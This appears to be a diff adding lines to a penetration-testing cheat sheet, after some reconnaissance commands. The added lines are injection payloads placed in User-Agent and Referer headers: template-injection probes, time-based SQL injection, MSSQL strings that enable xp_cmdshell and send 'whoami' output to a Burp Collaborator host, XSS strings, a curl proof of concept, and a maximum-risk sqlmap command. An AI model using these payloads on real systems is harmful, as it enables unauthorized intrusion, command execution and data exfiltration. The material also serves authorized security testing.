@@ -987,3 +987,19 @@ dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb
 
 subprober -f all.txt -tl -sc -sv -l -cn -ar -o output.txt -nc -mc 200 301 302 307 308 403 401 -c 20
 
+User-Agent: '">{{7*7}}${2*2}
+User-Agent: 1))%20or%20sleep(20)--
+User-Agent: Mozilla/5.0...Safari/537.36'--'--
+User-Agent: Mozilla/5.0...Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
+User-Agent: Mozilla/5.0...Safari/537.36'; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--
+User-Agent: Mozilla/5.0...Safari/537.36'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--
+User-Agent: Mozilla/5.0...Safari/537.36';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x"';--
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0<svg/onload=alert`1`>
+
+Referer: http://www.myevilsite.com/qwe';alert(1)+'
+Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5
+
+curl "https://www.aaa.bbb.ccc" -H 'User-Agent: <script>alert("XSS")</script>' > poc.html
+sqlmap --url "https://something.com/" --batch --random-agent --level 5 --risk 3
+
